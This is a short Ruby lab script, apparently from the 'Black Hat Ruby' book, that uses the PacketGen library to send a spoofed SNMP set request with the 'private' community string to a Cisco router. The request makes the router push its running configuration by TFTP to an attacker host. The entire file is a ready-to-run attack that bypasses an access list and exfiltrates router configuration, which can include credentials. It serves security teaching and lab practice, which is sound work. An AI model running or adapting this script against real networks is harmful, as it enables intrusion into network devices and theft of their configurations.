#!/usr/bin/env ruby
# ========================================================= #
# This file is a part of { Black Hat Ruby } book lab files. #
# ========================================================= #
#
# Author:
#   Sabri Hassanyah | @KINGSABRI
# Description:
#   Bypassing CISCO AccessList by SNMP IP Spoofing attack 
#   
# Requirements:
#   $ apt install libpcap-dev
#   $ gem install packetgen
# 
require 'packetgen'

bad_tftp = "192.168.200.10"
router   = "192.168.200.195"
spoofed  = "10.10.10.101"

pkt = PacketGen.gen('IP', src: spoofed, dst: router)
pkt.add('UDP', sport: 161, dport: 161)
pkt.add('SNMP', community: 'private', chosen_pdu: 3)
pkt.snmp.pdu[:varbindlist] << { name: "1.3.6.1.4.1.9.2.1.55.#{bad_tftp}", value: RASN1::Types::OctetString.new('pwnd-router.config') }
pkt.to_w('wls1')

